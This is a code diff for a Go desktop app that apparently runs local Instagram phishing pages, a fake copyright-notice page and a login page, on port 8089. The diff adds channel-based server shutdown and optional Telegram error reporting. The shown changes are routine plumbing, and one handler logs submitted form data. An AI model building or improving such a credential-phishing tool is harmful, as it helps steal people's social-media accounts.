@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -63,7 +64,7 @@ func getImage(username string) string {
 	return url
 }
 
-func serveInstagramTelif(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
+func serveInstagramTelif(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
 	serveFunc := func(response http.ResponseWriter, req *http.Request) {
 		log.Println("Requests -> ", req.Form.Encode())
 		query := req.URL.Query()
@@ -108,12 +109,31 @@ func serveInstagramTelif(win fyne.Window, textGrid *widget.TextGrid, textStream 
 		log.Println("Returning first page")
 		fmt.Fprintln(response, instagramCheckUsername)
 	}
-	http.HandleFunc("/", serveFunc)
-	err := http.ListenAndServe(":8089", nil)
-	dialog.ShowError(err, win)
+	/*
+		http.HandleFunc("/", serveFunc)
+		err := http.ListenAndServe(":8089", nil)
+		dialog.ShowError(err, win)*/
+
+	m := http.NewServeMux()
+	s := http.Server{Addr: ":8089", Handler: m}
+	m.HandleFunc("/", serveFunc)
+
+	go func() {
+		<-kapat
+		s.Shutdown(context.Background())
+		fmt.Println("Server Shutdown")
+
+	}()
+
+	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
+		if useTelegramBot {
+			tg.send(err.Error())
+		}
+		dialog.ShowError(err, win)
+	}
 }
 
-func serveInstagramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
+func serveInstagramLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
 	serveFunc := func(res http.ResponseWriter, req *http.Request) {
 
 		if !errHandler.HandlerBool(req.ParseForm()) {
@@ -146,6 +166,24 @@ func serveInstagramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream 
 		return
 
 	}
-	http.HandleFunc("/", serveFunc)
-	http.ListenAndServe(":8089", nil)
+	/*http.HandleFunc("/", serveFunc)
+	http.ListenAndServe(":8089", nil)*/
+
+	m := http.NewServeMux()
+	s := http.Server{Addr: ":8089", Handler: m}
+	m.HandleFunc("/", serveFunc)
+
+	go func() {
+		<-kapat
+		s.Shutdown(context.Background())
+		fmt.Println("Server Shutdown")
+
+	}()
+
+	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
+		if useTelegramBot {
+			tg.send(err.Error())
+		}
+		dialog.ShowError(err, win)
+	}
 }
